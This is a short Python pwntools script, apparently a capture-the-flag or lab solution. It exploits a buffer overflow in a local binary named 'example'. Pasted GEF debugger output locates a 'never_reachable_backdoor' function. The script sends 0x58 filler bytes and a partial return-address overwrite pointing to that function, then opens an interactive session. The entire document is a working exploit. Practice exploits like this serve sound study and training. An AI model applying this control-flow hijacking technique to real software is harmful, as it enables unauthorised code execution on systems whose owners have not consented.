from pwn import *

context.log_level = 'DEBUG'

'''
gef➤  p never_reachable_backdoor
$1 = {<text variable, no debug info>} 0x123a <never_reachable_backdoor>
gef➤  disass main
Dump of assembler code for function main:
   0x00000000000012dd <+0>:	endbr64
   0x00000000000012e1 <+4>:	push   rbp
   0x00000000000012e2 <+5>:	mov    rbp,rsp
   0x00000000000012e5 <+8>:	sub    rsp,0x10
   0x00000000000012e9 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000000012ec <+15>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000000012f0 <+19>:	mov    eax,0x0
   0x00000000000012f5 <+24>:	call   0x11e9 <prepare>
   0x00000000000012fa <+29>:	mov    eax,0x0
   0x00000000000012ff <+34>:	call   0x1274 <leaf>
   0x0000000000001304 <+39>:	mov    eax,0x0
   0x0000000000001309 <+44>:	leave
   0x000000000000130a <+45>:	ret
'''

conn = process("./example")

payload = flat(
    b"A" * 0x58,
    p16(0x123a)
)

conn.sendlineafter(b"size: ", str(len(payload)))

# pause()

conn.send(payload)

conn.interactive()
